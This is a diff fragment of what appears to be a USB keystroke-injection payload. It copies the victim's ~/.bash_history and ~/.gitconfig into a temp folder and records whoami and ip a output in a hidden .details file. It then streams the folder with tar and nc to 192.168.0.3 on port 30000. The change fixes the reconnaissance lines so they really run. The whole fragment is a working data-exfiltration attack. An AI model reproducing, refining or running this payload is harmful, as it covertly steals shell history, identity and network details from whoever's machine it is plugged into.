@@ -21,9 +21,9 @@ STRING cp ~/.bash_history ~/temp_dir
 ENTER
 STRING cp ~/.gitconfig ~/temp_dir
 ENTER
-STRING echo whoami >> ~/temp_dir/.details
+STRING whoami >> ~/temp_dir/.details
 ENTER
-STRING echo ip a >> ~/temp_dir/.details
+STRING ip a >> ~/temp_dir/.details
 ENTER
 STRING tar cf - temp_dir | nc 192.168.0.3 30000
 ENTER
